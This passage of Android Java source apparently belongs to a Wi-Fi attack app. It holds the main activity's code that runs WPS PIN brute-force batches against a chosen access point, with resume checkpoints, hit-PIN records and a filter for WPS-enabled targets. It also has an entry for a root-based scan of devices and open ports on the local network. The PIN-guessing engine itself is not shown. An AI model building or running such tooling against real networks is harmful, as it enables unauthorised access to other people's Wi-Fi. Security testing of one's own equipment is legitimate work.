        wpsResumeLine.setText(line);
        wpsResumeLine.setVisibility(line.isEmpty() ? android.view.View.GONE
                : android.view.View.VISIBLE);
    }

    /**
     * 断点状态的一句话说明。
     *
     * @param forToast 用于 Toast 时加上「怎么办」的指引
     */
    private String wpsResumeSummary(boolean ready) {
        try {
            io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint.Parse all = wpsCpStore().load();
            if (!all.ok()) return "";
            io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint cp = all.cp;
            String tag = cp.bssid == null || cp.bssid.isEmpty() ? "?"
                    : cp.bssid.substring(Math.max(0, cp.bssid.length() - 5));
            String base = L.s("断点：" + (cp.ssid == null || cp.ssid.isEmpty() ? "?" : cp.ssid)
                            + "（" + tag + "）· 策略 " + wpsModeLabel(cp.mode)
                            + " · 阶段 " + cp.phase + " · 已完成 " + cp.cursor
                            + "/" + io.github.wlmosv_png.wpaforge.wps.WpsCandidates.phaseTotal(cp.phase),
                    "checkpoint: " + cp.ssid + " (" + tag + ") mode " + cp.mode
                            + " phase " + cp.phase + " done " + cp.cursor);
            if (ready) return base + L.s(" —— 可以点「继续」", " - press Resume");
            if (wpsTargetMgr.selected() == null) {
                return base + L.s("\n当前没有选中目标；扫描并选中 " + cp.ssid + " 后即可继续。",
                        "\nno target selected; scan and pick it to resume.");
            }
            if (cp.mode != wpsMode) {
                return base + L.s("\n当前策略是「" + wpsModeLabel(wpsMode) + "」，与断点不同；"
                                + "切回该策略才能续跑。",
                        "\ncurrent strategy differs from the checkpoint.");
            }
            String why = cp.mismatchReason(wpsTargetMgr.selected().bssid, wpsTargetSsidForMatch(), wpsMode, true);
            if (why != null && !why.isEmpty()) return base + "\n" + why;
            return base;
        } catch (Throwable t) {
            return "";
        }
    }

    private String wpsModeLabel(int mode) {
        if (mode >= 0 && mode < WPS_MODE_ZH.length) {
            return L.s(WPS_MODE_ZH[mode], WPS_MODE_EN[mode]);
        }
        return L.s("未知策略", "unknown");
    }

    /**
     * 重置进度前的二次确认。
     *
     * <p>修复前「重置进度」按钮就在「继续」旁边，点一下**没有任何确认**就把
     * 几十小时的进度抹掉（用户反馈的「误触后点击清除，导致重新运行」）。
     * 现在：先确认，并明确列出「清什么、不清什么」。
     */
    private void confirmResetWps() {
        io.github.wlmosv_png.wpaforge.wps.WpsCheckpoint.Parse p = wpsCpStore().load();
        String detail = p.ok()
                ? wpsResumeSummary(false)
                        + L.s("\n\n将清除：断点（阶段 / 游标 / 前缀）。"
                                + "\n不会清除：历史任务与命中记录。",
                        "\n\nClears: checkpoint only."
                                + "\nKeeps: task history and hit records.")
                : L.s("当前没有断点可清。历史记录不受影响。",
                        "No checkpoint to clear. History is untouched.");
        io.github.wlmosv_png.wpaforge.ui.NetDialog dlg = new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                L.s("重置 WPS 进度？", "Reset WPS progress?"), detail);
        dlg.setDanger(L.s("重置进度", "Reset"), nd -> doResetWps());
        dlg.setNegative(L.s("取消", "Cancel"), null);
        dlg.show();
    }

    /**
     * 真正的重置：**只清断点**。
     *
     * <p>台账（历史任务与命中）永久保留 —— 重置进度不是删历史。
     */
    private void doResetWps() {
        if (wpsTaskMgr().isRunning()) {
            wpsCancel = true;
        }
        boolean cleared = wpsTaskMgr().clearCheckpoint();
        wpsHalfCursor1 = 0;
        wpsSession = null;
        wpsEnumCursor = 0;
        refreshWpsProgress();
        refreshWpsButtons();
        Toast.makeText(this, cleared
                        ? L.s("进度已重置（历史记录保留）", "Progress reset (history kept)")
                        : L.s("没有可清除的断点", "nothing to reset"),
                Toast.LENGTH_SHORT).show();
    }

    // ---------------- 历史与证据（只读入口） ----------------

    /** 历史任务与命中（台账的只读入口）。 */
    private void showWpsHistoryDialog() {
        java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsLedger.Task> all = wpsLedger().load();
        StringBuilder sb = new StringBuilder();
        sb.append(io.github.wlmosv_png.wpaforge.wps.WpsLedger.summary(all, true)).append('\n').append('\n');
        int shown = 0;
        for (int i = all.size() - 1; i >= 0 && shown < 20; i--, shown++) {
            io.github.wlmosv_png.wpaforge.wps.WpsLedger.Task t = all.get(i);
            sb.append("· ").append(t.ssid == null || t.ssid.isEmpty() ? "?" : t.ssid)
                    .append("  ").append(t.bssid)
                    .append("   ").append(t.status)
                    .append("   ").append(wpsModeLabel(t.mode))
                    .append("   ").append(L.s("阶段 ", "phase ")).append(t.phase)
                    .append("   ").append(t.doneCount).append("/")
                    .append(io.github.wlmosv_png.wpaforge.wps.WpsCandidates.phaseTotal(t.phase));
            if (t.hasHit()) {
                sb.append('\n').append("    ★ ")
                        .append(L.s("命中 ", "HIT ")).append(t.hitPin);
                if (t.evidence != null && !t.evidence.isEmpty()) {
                    sb.append('\n').append("    ").append(t.evidence);
                }
            }
            // 纠错审计行（P0-3）：原始判定与修正结果同时可读；纠正后的任务不再显示为命中
            if (t.corrected) {
                sb.append('\n').append("    ⟲ ")
                        .append(L.s("已纠错：", "corrected: "))
                        .append(t.originalVerdict).append(" → ").append(t.correctedVerdict);
                if (t.originalPin != null && !t.originalPin.isEmpty()) {
                    sb.append("  ").append(L.s("原始 PIN ", "orig PIN ")).append(t.originalPin);
                }
                if (t.correctionReason != null && !t.correctionReason.isEmpty()) {
                    sb.append('\n').append("      ").append(t.correctionReason);
                }
            } else if (t.hitVerdict != null && !t.hitVerdict.isEmpty()) {
                sb.append('\n').append("    ").append(t.hitVerdict);
            }
            if (t.endReason != null && !t.endReason.isEmpty()) {
                sb.append('\n').append("    ").append(L.s("结束：", "end: "))
                        .append(t.endReason);
            }
            sb.append('\n');
        }
        if (all.isEmpty()) sb.append(L.s("（还没有历史任务）", "(no tasks yet)"));
        // 追加专项统计（全部来自真实落盘的数据；无数据显示「暂无数据」）
        sb.append('\n').append(L.s("==== 专项统计 ====\n", "==== stats ====\n"))
                .append(wpsStats.detail(L.s("a", "b").equals("a")));
        // 2026-11-09：改用统一组件 NetDialog（滚动大文本），与其它页风格一致
        io.github.wlmosv_png.wpaforge.ui.NetDialog.textInfo(this, L.s("WPS 历史任务", "WPS history"), sb.toString());
    }

    /**
     * 命中证据明细：协议 / 凭据 / 联网三种事实分开看。
     *
     * <p>这是「显示命中却连不上」的对症入口 —— 用户能自己看到
     * 「协议确认了、凭据也交付了，但当时没有 IP」这类真相，
     * 而不是只看到一个「已命中」。
     */
    private void showWpsEvidenceDialog() {
        io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session se = wpsSession;
        io.github.wlmosv_png.wpaforge.wps.WpsLedger.Task lastHit =
                io.github.wlmosv_png.wpaforge.wps.WpsLedger.latestHit(wpsLedger().load());
        StringBuilder sb = new StringBuilder();

        // 三级可信等级：已确认 / 待验证 / 未确认。
        boolean zh = L.s("a", "b").equals("a");
        io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session cur = se;
        if (cur != null && io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_HIT.equals(cur.verdict)) {
            // 本次会话命中：给出可信等级 + 证据摘要 + 缺失证据清单
            String lvl = io.github.wlmosv_png.wpaforge.wps.WpsHitJudge.levelField(cur);
            sb.append(L.s("本次命中 · 可信等级：", "This hit · level: "))
                    .append(io.github.wlmosv_png.wpaforge.wps.WpsHitJudge.levelText(lvl, zh))
                    .append('\n');
            sb.append(io.github.wlmosv_png.wpaforge.wps.WpsEngine.evidenceSummary(cur)).append('\n');
            // 缺失证据（本实现/Android 15 无法提供的如实列出，不伪造）
            java.util.List<String> miss = io.github.wlmosv_png.wpaforge.wps.WpsHitJudge.missing(cur);
            if (!miss.isEmpty()) {
                sb.append(L.s("\n缺失的证据（不能据此判断完整成功）：\n",
                        "\nMissing evidence (full success cannot be confirmed without):\n"));
                for (String m : miss) {
                    sb.append("  · ").append(
                            io.github.wlmosv_png.wpaforge.wps.WpsHitJudge.missingLabel(m, zh))
                            .append('\n');
                }
            }
        } else if (lastHit != null && lastHit.hasHit()) {
            // 历史命中：不得自动升级成已确认 —— 旧记录无本会话观测证据
            sb.append(L.s("本次没有命中。最近一次历史命中（可信等级：待验证，非已确认）：\n",
                    "No hit this run. Latest historical hit (level: pending, not confirmed):\n"));
            sb.append("PIN=").append(lastHit.hitPin).append('\n');
            sb.append("SSID=").append(lastHit.ssid).append("   BSSID=")
                    .append(lastHit.bssid).append('\n');
            if (lastHit.evidence != null && !lastHit.evidence.isEmpty()) {
                sb.append(lastHit.evidence).append('\n');
            } else {
                sb.append(L.s("（该历史命中没有保存原始证据 —— 旧版本只记了 PIN，无法按新标准核实）",
                        "(historical hit has no raw evidence — old version stored only PIN)"));
            }
        } else {
            sb.append(L.s("还没有任何命中记录。", "No hits recorded yet."));
        }

        sb.append(L.s("\n\n可信等级说明：\n"
                        + "· 已确认 = 必要证据完整，能证明结果\n"
                        + "· 待验证 = 观察到相关事件，但还不能证明完整结果\n"
                        + "· 未确认 = 缺少关键证据或无法建立可靠关联\n"
                        + "本机/Android 15 读不到协议终局（WPS-SUCCESS）与凭据存在性，"
                        + "因此即便归属与二次确认都成立，通常也只会到「待验证」。",
                "\n\nLEVELS:\n· confirmed = necessary evidence complete\n"
                        + "· pending = observed but cannot fully prove\n"
                        + "· unconfirmed = missing key evidence\n"
                        + "This device/Android 15 cannot read protocol terminal or credential, "
                        + "so hits usually cap at 'pending'."));
        io.github.wlmosv_png.wpaforge.ui.NetDialog.textInfo(this, L.s("命中证据", "Hit evidence"), sb.toString());
    }

    /**
     * 跑一小批候选。
     *
     * <p><b>返回值的含义</b>：helper 实际**处理过**的候选结果（含 SKIPPED_INVALID）。
     * 调用方必须按它推进游标 —— 不能按请求条数（暂停/预算耗尽时会跳候选）。
     */
    private java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Result> runWpsBatch(
            java.util.List<String> pins) {
        java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Result> none =
                new java.util.ArrayList<>();
        if (pins.isEmpty()) return none;
        wpsLog(L.s("[i] 尝试 ", "[i] trying ") + pins.size()
                + L.s(" 个候选：", " candidates: ") + pins.get(0) + " …");
        java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Result> rs =
                io.github.wlmosv_png.wpaforge.wps.WpsController.batch(
                        this, wpsTargetMgr.selected().bssid, wpsTargetSsidForMatch(), pins,
                        WPS_PER_TRY_SEC, WPS_BATCH_BUDGET,
                        new io.github.wlmosv_png.wpaforge.wps.WpsController.Listener() {
                            @Override
                            public void onLine(String line) {
                            }

                            @Override
                            public void onResult(io.github.wlmosv_png.wpaforge.wps.WpsController.Result r) {
                                // 2026-11-09（P0-2）：取消后**不得**再观察/记账/打日志 ——
                                // 否则"停止"之后仍会新增候选结果与统计。
                                if (wpsCancel) return;
                                io.github.wlmosv_png.wpaforge.wps.WpsEngine.observe(wpsSession,
                                        new io.github.wlmosv_png.wpaforge.wps.WpsEngine.Attempt(r));
                                // 统计：每次结果实时累计并原子落盘（跨进程可恢复）
                                wpsStatsAdd(r.status, r.elapsedMs);
                                // 命中/疑似：证据必须写进日志（修复前证据只进日志文件，
                                // App 侧既不显示也不解释）
                                if (r.isSuccess()) {
                                    wpsEvidenceMgr.record(wpsTaskId, r.hitVerdict,
                                            r.hitFacts, r.hitWhy);
                                    wpsLog(L.s("★★★ 已命中（协议确认 + 目标归属成立）：PIN=" + r.pin,
                                            "★★★ HIT (confirmed): " + r.pin));
                                    wpsLog("      " + r.hitWhy + "   facts=" + r.hitFacts);
                                } else if (r.isUnverified()) {
                                    wpsEvidenceMgr.record(wpsTaskId, r.hitVerdict,
                                            r.hitFacts, r.hitWhy);
                                    wpsLog(L.s("· 疑似命中（证据不足，已记录、不判命中）：" + r.pin,
                                            "· suspect (recorded, not a hit): " + r.pin));
                                    wpsLog("      " + r.hitWhy);
                                }
                                boolean wasTalking = wpsSession != null && wpsSession.everWpsSession;
                                boolean wasReal = wpsSession != null && wpsSession.everRealWps;
                                boolean zhR = L.s("a", "b").equals("a");
                                wpsLog("  " + r.pin + "  " + r.label(zhR)
                                        + "  " + r.elapsedMs + "ms"
                                        + (r.wpsSession ? "  [WPS]" : "")
                                        + "  assoc=" + r.assocCount + "/" + r.maxAssocMs + "ms");
                                if (r.halfPrefixAccepted() && wpsSession != null
                                        && wpsSession.halfPhase == 1 && r.pin.length() >= 4) {
                                    wpsSession.halfPrefix = r.pin.substring(0, 4);
                                    wpsSession.halfPrefixHit = true;
                                }
                                if (!wasReal && wpsSession != null && wpsSession.everRealWps) {
                                    wpsLog(L.s("  ★★ 真实 WPS 交换确认（关联 "
                                                    + String.format(java.util.Locale.US, "%.1f", r.maxAssocMs / 1000.0)
                                                    + "s）—— 这是有效目标，把候选跑完。",
                                            "  ★★ Real WPS exchange confirmed - valid target, run the list."));
                                } else if (!wasTalking && wpsSession != null && wpsSession.everWpsSession) {
                                    wpsLog(L.s("  · 只看到瞬时关联（" + r.maxAssocMs
                                                    + "ms），该 AP 多半没在等配对。",
                                            "  \u00b7 Only a brief association - AP probably not pairing."));
                                }
                                runOnUiThread(MainActivity.this::refreshWpsProgress);
                            }

                            @Override
                            public boolean isCancelled() {
                                return wpsCancel;
                            }
                        });
        if (wpsCancel) {
            // 已取消：立即返回，不做后续同步（收尾由 runWpsAttack 的 finally 负责）
            return rs;
        }
        if (rs.isEmpty()) {
            wpsLog(L.s("[w] 本批没有返回结果（助手进程可能没起来）",
                    "[w] no results from this batch"));
        }
        wpsTaskSync(rs.isEmpty() ? "" : rs.get(rs.size() - 1).pin,
                rs.isEmpty() ? "" : rs.get(rs.size() - 1).status);
        runOnUiThread(MainActivity.this::refreshWpsProgress);
        return rs;
    }

    /**
     * 观测页 —— Obsidian Amber 重构。
     *
     * <h3>结构（自上而下六段）</h3>
     * <pre>
     *   ① 扫描卡      雷达 + 中心大数字（N 个网络）
     *   ② 侦察入口    局域网设备探测（保留原入口与回调）
     *   ③ 信号分布    柱状图卡
     *   ④ 信道占用    占用条 + 信道建议卡（标题单独一行）
     *   ⑤ 本机已存    一行卡片，点开看详情（回调不变）
     *   ⑥ 发现网络    筛选片（选中态实心琥珀）+ 卡片化列表 / 空状态
     * </pre>
     *
     * <p>数据来源、筛选语义、扫描频率与全部回调**与改版前一致**；这一版只重排布局、
     * 统一配色与尺寸，并把「当前生效的筛选」显示出来（改版前筛选片没有选中态）。
     */
    /**
     * 刷新雷达卡头部：状态文案 + 按钮可用性。
     *
     * <p>三种状态：能扫（按钮可点）／冷却中（按钮变暗，文案给出秒数）／
     * 上次被系统拒（文案说明是"系统限制了频率"，不是软件坏了）。
     */
    private void updateRadarStatus() {
        if (radarStatus == null) return;
        long now = System.currentTimeMillis();
        StringBuilder sb = new StringBuilder();
        long last = scanner == null ? 0 : scanner.lastResultsAt();
        if (last <= 0) {
            sb.append(L.s("正在扫描…", "Scanning\u2026"));
        } else {
            long sec = Math.max(0, (now - last) / 1000);
            sb.append(sec <= 3
                    ? L.s("刚刚更新", "Updated just now")
                    : L.s("最后更新 " + sec + " 秒前", "Updated " + sec + "s ago"));
            if (lastDiff != null && lastDiff.changed()) {
                sb.append(" · ").append(lastDiff.label(" · "));
            }
        }
        String text = sb.toString();
        if (!text.contentEquals(radarStatus.getText())) radarStatus.setText(text);
    }

    /**
     * 雷达图例：五档信号色 + dBm 区间，并说明实心/空心＝2.4G/5G。
     *
     * <p>刻度值不在这里另写一份 —— 从 {@link RadarSweep#ringLabels()} 取，
     * 与盘上画环用的是同一组常量。
     */
    private View radarLegend() {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setPadding(0, px(10), 0, 0);

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        String[] labels = RadarSweep.ringLabels();
        int[] colors = RadarSweep.ringColors();
        TextView cap = new TextView(this);
        cap.setText(L.s("由内到外：", "Inner to outer: "));
        cap.setTextSize(AmberTheme.FS_LABEL);
        cap.setTextColor(AmberTheme.TEXT_FAINT);
        row.addView(cap);
        // ringLabels() 是按「由外到内」排的（下标 0 = 最外环 = 最弱），
        // 这里**倒着显示**，读序才和「由内到外」的说明对得上
        for (int i = labels.length - 1; i >= 0; i--) {
            row.addView(legendChip(labels[i], colors[i]));
        }
        box.addView(row);

        TextView band = new TextView(this);
        band.setText(L.s("● 实心 = 2.4G    ○ 空心 = 5G    圆心 = 信号最强",
                "● filled = 2.4G    ○ hollow = 5G    centre = strongest"));
        band.setTextSize(AmberTheme.FS_LABEL);
        band.setTextColor(AmberTheme.TEXT_FAINT);
        band.setPadding(0, px(5), 0, 0);
        box.addView(band);
        return box;
    }

    /** 图例里的一格：小圆点 + dBm 文字 */
    private View legendChip(String label, int color) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.HORIZONTAL);
        box.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.rightMargin = px(9);
        box.setLayoutParams(lp);

        View dot = new View(this);
        android.graphics.drawable.GradientDrawable g = new android.graphics.drawable.GradientDrawable();
        g.setShape(android.graphics.drawable.GradientDrawable.OVAL);
        g.setColor(color);
        dot.setBackground(g);
        box.addView(dot, new LinearLayout.LayoutParams(px(8), px(8)));

        TextView t = new TextView(this);
        t.setText(label);
        t.setTextSize(AmberTheme.FS_LABEL);
        t.setTextColor(AmberTheme.TEXT_DIM);
        LinearLayout.LayoutParams tlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        tlp.leftMargin = px(4);
        box.addView(t, tlp);
        return box;
    }

    /**
     * 雷达卡的关键数字：频段分布 / 最挤的信道 / 未加密台数。
     *
     * <p>这三个数是**从雷达盘上读不出来、但看盘的人一定会问**的问题：
     * 「几个是 5G 的」「哪条信道最挤」「有几个连密码都没有」。
     */
    private void renderRadarStats(List<NetRecord> nets) {
        if (radarStatsBox == null) return;
        radarStatsBox.removeAllViews();
        int n24 = 0, n5 = 0, open = 0;
        int bestRssi = Integer.MIN_VALUE;
        int[] perChannel = new int[200];
        for (NetRecord r : nets) {
            if (r.is5Ghz) n5++;
            else n24++;
            if (r.security == NetRecord.Security.OPEN || r.security == NetRecord.Security.WEP) open++;
            bestRssi = Math.max(bestRssi, r.rssi);
            if (!r.is5Ghz && r.channel > 0 && r.channel < perChannel.length) perChannel[r.channel]++;
        }
        int busiest = 0, busiestN = 0;
        for (int ch = 1; ch <= 14; ch++) {
            if (perChannel[ch] > busiestN) {
                busiestN = perChannel[ch];
                busiest = ch;
            }
        }
        radarStatsBox.addView(statCell(L.s("2.4G", "2.4G"), n24 + L.s(" 台", "")));
        radarStatsBox.addView(statCell(L.s("5G", "5G"), n5 + L.s(" 台", "")));
        // 这一格最容易被挤爆：去掉「台」这种会顶到边上的字，
        // 数值一律用「ch 6 · 3」的短写法
        radarStatsBox.addView(statCellWide(L.s("最挤", "Busiest"),
                busiestN > 0 ? "ch " + busiest + " \u00b7 " + busiestN : "\u2014"));
        radarStatsBox.addView(statCell(L.s("未加密", "Open"), open + L.s(" 台", "")));
        radarStatsBox.addView(statCell(L.s("最强", "Best"),
                bestRssi == Integer.MIN_VALUE ? "\u2014" : bestRssi + " dBm"));
    }

    /** 「最挤」那格再宽一点（内容最长） */
    private View statCellWide(String label, String value) {
        LinearLayout box = (LinearLayout) statCell(label, value);
        LinearLayout.LayoutParams lp = (LinearLayout.LayoutParams) box.getLayoutParams();
        lp.weight = 1.35f;
        return box;
    }

    /** 关键数字的一格：上面小标签、下面数值 */
    private View statCell(String label, String value) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setLayoutParams(new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        TextView l = new TextView(this);
        l.setText(label);
        l.setTextSize(AmberTheme.FS_MICRO);
        l.setTextColor(AmberTheme.TEXT_FAINT);
        TextView v = new TextView(this);
        v.setText(value);
        v.setTextSize(AmberTheme.FS_MONO);
        v.setTextColor(AmberTheme.TEXT);
        v.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        v.setSingleLine(true);
        v.setEllipsize(android.text.TextUtils.TruncateAt.END);
        box.addView(l);
        box.addView(v);
        return box;
    }

    private void buildObserveTab() {
        // ① 扫描卡：雷达放进卡片，中心数字仍由 RadarSweep 自己画
        LinearLayout radarCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        radar = new RadarSweep(this);
        // 头部行：左＝状态（最后更新 / 系统限流倒计时），右＝重新扫描。
        // 系统对 startScan 有约 30 秒的频率限制，按钮必须**如实反映**能不能按，
        // 否则用户点了没反应，只会以为软件坏了。
        radarStatus = new TextView(this);
        radarStatus.setTextSize(AmberTheme.FS_SMALL);
        radarStatus.setTextColor(AmberTheme.TEXT_DIM);
        radarStatus.setSingleLine(true);
        radarStatus.setEllipsize(android.text.TextUtils.TruncateAt.END);
        radarStatus.setGravity(Gravity.CENTER_VERTICAL);
        radarStatus.setPadding(px(2), px(2), px(2), px(8));
        LinearLayout.LayoutParams hlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        hlp.bottomMargin = px(4);
        radarStatus.setLayoutParams(hlp);
        radarCard.addView(radarStatus);

        radarCard.addView(radar, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(224)));
        radar.setCenterText(L.s("扫描中", "Scanning"),
                L.s("正在探测周边网络", "Probing nearby networks"));
        // 雷达盘上只留信道标（盘面太窄，文字和点抢位置怎么调都是输），
        // dBm 刻度与频段含义做成盘下的图例；再配一行关键数字，
        // 免得这张卡除了一个圆盘之外什么都没说。
        radarCard.addView(radarLegend());
        radarStatsBox = new LinearLayout(this);
        radarStatsBox.setOrientation(LinearLayout.HORIZONTAL);
        radarStatsBox.setPadding(0, px(8), 0, 0);
        radarCard.addView(radarStatsBox);
        LinearLayout.LayoutParams rcp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rcp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(radarCard, rcp);

        observeNotice = new TextView(this);
        observeNotice.setTextSize(AmberTheme.FS_BODY);
        observeNotice.setTextColor(DANGER);
        observeNotice.setLineSpacing(px(4), 1f);
        observeNotice.setBackground(roundBg(AmberTheme.DANGER_SOFT_BG, AmberTheme.RADIUS_CARD));
        observeNotice.setPadding(px(14), px(12), px(14), px(12));
        observeNotice.setVisibility(View.GONE);
        LinearLayout.LayoutParams onlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        onlp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(observeNotice, onlp);

        // ② 网络侦察入口：终端式局域网设备探测（需 root）。
        // 大胶囊按钮改为**卡片行**（标题 + 副标题 + ›）：与设置页/审计页同一套行结构，
        // 页面上不再出现"一个占满屏幕宽度的按钮"。回调与入口一字未改。
        LinearLayout reconCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        LinearLayout reconRow = new LinearLayout(this);
        reconRow.setOrientation(LinearLayout.VERTICAL);
        reconRow.setBackground(io.github.wlmosv_png.wpaforge.ui.UiKit.ripple(
                AmberTheme.CARD, dp(AmberTheme.RADIUS_CHIP)));
        reconRow.setPadding(0, px(2), 0, px(2));
        reconCard.addView(reconRow);

        TextView reconTitle = new TextView(this);
        reconTitle.setText(L.s("网络侦察", "LAN recon") + "   ›");
        reconTitle.setTextSize(AmberTheme.FS_BODY + 1f);
        reconTitle.setTextColor(TEXT);
        reconTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        reconRow.addView(reconTitle);

        TextView reconSub = new TextView(this);
        reconSub.setText(L.s("探测当前 WiFi 网段里的设备与开放端口（需 root）",
                "Probe devices and open ports on the current WiFi subnet (root)"));
        reconSub.setTextSize(AmberTheme.FS_LABEL);
        reconSub.setTextColor(AmberTheme.TEXT_FAINT);
        reconSub.setLineSpacing(px(3), 1f);
        LinearLayout.LayoutParams rslp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rslp.topMargin = px(3);
        reconRow.addView(reconSub, rslp);

        reconRow.setOnClickListener(v -> {
            try {
                startActivity(new android.content.Intent(this,
                        io.github.wlmosv_png.wpaforge.ui.LanProbeActivity.class));
            } catch (Throwable t) {
                Toast.makeText(this, "无法打开: " + t.getMessage(),
                        Toast.LENGTH_SHORT).show();
            }
        });
        LinearLayout.LayoutParams rclp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        rclp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(reconCard, rclp);

        // ③ 信号分布
        pageObserve.addView(sectionLabel(L.s("信号分布", "Signal distribution")));
        LinearLayout barsCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        signalBoard = new LinearLayout(this);
        signalBoard.setOrientation(LinearLayout.VERTICAL);
        barsCard.addView(signalBoard);
        LinearLayout.LayoutParams bcp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        bcp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(barsCard, bcp);

        // ④ 信道占用：横向条，一眼看出哪个信道空、哪个挤
        pageObserve.addView(sectionLabel(L.s("信道占用", "Channel occupancy")));
        LinearLayout chanCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        channelBars = new ChannelBars(this);
        chanCard.addView(channelBars, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        LinearLayout.LayoutParams ccp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        ccp.bottomMargin = px(AmberTheme.GAP_CARD);
        pageObserve.addView(chanCard, ccp);

        // 建议卡：标题单独一行（琥珀小字），正文才是建议内容
        LinearLayout adviceBox = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        adviceTitle = AmberTheme.label(this, L.s("信道建议", "CHANNEL ADVICE"));
        adviceTitle.setTextColor(ACCENT);
        adviceBox.addView(adviceTitle);
        adviceCard = new TextView(this);
        adviceCard.setTextSize(AmberTheme.FS_BODY);
        adviceCard.setTextColor(TEXT);
        adviceCard.setLineSpacing(px(5), 1f);
        LinearLayout.LayoutParams atlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        atlp.topMargin = px(6);
        adviceBox.addView(adviceCard, atlp);
        adviceBox.setVisibility(View.GONE);
        LinearLayout.LayoutParams alp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        alp.bottomMargin = px(AmberTheme.GAP_CARD);
        adviceBox.setLayoutParams(alp);
        adviceBoxRef = adviceBox;
        pageObserve.addView(adviceBox);

        // ⑤ 本机已存 WiFi：一行卡片，点开看详情
        pageObserve.addView(sectionLabel(L.s("本机已存 WiFi", "Saved Wi-Fi on this device")));
        savedWifiCard = new TextView(this);
        savedWifiCard.setTextSize(AmberTheme.FS_BODY);
        savedWifiCard.setTextColor(TEXT);
        savedWifiCard.setLineSpacing(px(5), 1f);
        savedWifiCard.setBackground(roundBgStroked(AmberTheme.CARD, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        savedWifiCard.setPadding(px(AmberTheme.PAD_H), px(AmberTheme.PAD_V),
                px(AmberTheme.PAD_H), px(AmberTheme.PAD_V));
        LinearLayout.LayoutParams swlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        swlp.bottomMargin = px(AmberTheme.GAP_CARD);
        savedWifiCard.setLayoutParams(swlp);
        savedWifiCard.setOnClickListener(v -> showSavedWifi());
        pageObserve.addView(savedWifiCard);
        updateSavedWifiCard();

        // ⑥ 发现网络
        pageObserve.addView(sectionLabel(L.s("发现网络", "Networks found")));

        // 筛选行
        HorizontalScrollView filterBar = new HorizontalScrollView(this);
        filterBar.setHorizontalScrollBarEnabled(false);
        LinearLayout fb = new LinearLayout(this);
        fb.setOrientation(LinearLayout.HORIZONTAL);
        fb.setPadding(0, 0, 0, px(10));
        fb.addView(filterChip(L.s("全部", "All"), FILTER_ALL));
        fb.addView(filterChip(L.s("加密", "Secured"), FILTER_SECURE));
        fb.addView(filterChip(L.s("开放", "Open"), FILTER_OPEN));
        fb.addView(filterChip(L.s("隐藏 SSID", "Hidden SSID"), FILTER_HIDDEN));
        // WPS 专项：wpsSupported 一直在解析但从没展示过。
        // 这个筛选把开了 WPS 的 AP 单独列出来。
        fb.addView(filterChip("WPS", FILTER_WPS));
        filterBar.addView(fb);
        pageObserve.addView(filterBar);
        renderFilterChips();

        netList = new LinearLayout(this);
        netList.setOrientation(LinearLayout.VERTICAL);
        pageObserve.addView(netList);

        // 立即渲染一遍缓存（回到该页时不至于空白）
        renderRecords(lastRecords);
        if (scanner != null) {
            observeNotice.setVisibility(View.GONE);
            scanner.start();
        }
    }

